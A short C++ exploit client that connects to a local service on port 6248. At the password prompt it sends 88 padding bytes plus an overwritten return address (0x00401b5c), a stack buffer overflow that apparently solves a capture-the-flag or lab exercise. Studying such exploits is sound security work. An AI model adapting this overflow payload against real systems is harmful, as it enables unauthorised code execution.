#include <arpa/inet.h>
#include <cstring>
#include <iostream>
#include <sys/socket.h>
#include <unistd.h>

int main() {
    int port = 6248;
    sockaddr_in server;
    int socket_descriptor = socket(AF_INET, SOCK_STREAM, 0);
    if (socket_descriptor == -1) {
        std::cerr << "Socket creation error" << std::endl;
        return 1;
    }
    memset(&server, 0, sizeof(server));
    server.sin_family = AF_INET;
    server.sin_port = htons(port);
    if (inet_aton("127.0.0.1", &server.sin_addr) <= 0) {
        std::cerr << "Incorrect address" << std::endl;
        return 1;
    }
    int res = connect(socket_descriptor, (sockaddr *)&server, sizeof(server));
    if (res == -1) {
        std::cerr << "Connection error" << std::endl;
        return 1;
    }

    const int bufsize = 1024;
    char buffer[bufsize];
    int received = 0;

    while ((received = recv(socket_descriptor, buffer, bufsize - 1, 0)) > 0) {
        buffer[received] = '\0';
        std::cout << "Server: " << buffer;

        if (strstr(buffer, "Please enter a password to continue:") != nullptr) {
            char password[88 + 8 + 1];
            for (int i = 0; i < 88; i++) {
                password[i] = ' ';
            }
            *(reinterpret_cast<size_t *>(password + 88)) = 0x00401b5c;

            password[88 + 8] = '\n';
            send(socket_descriptor, password, sizeof(password), 0);
            std::cout << "Sent password: " << password;
        }

        if (strstr(buffer, "Success!") != nullptr ||
            strstr(buffer, "Disconnecting") != nullptr) {
            break;
        }
    }

    if (received < 0) {
        std::cerr << "Error receiving response" << std::endl;
    }

    close(socket_descriptor);
    return 0;
}
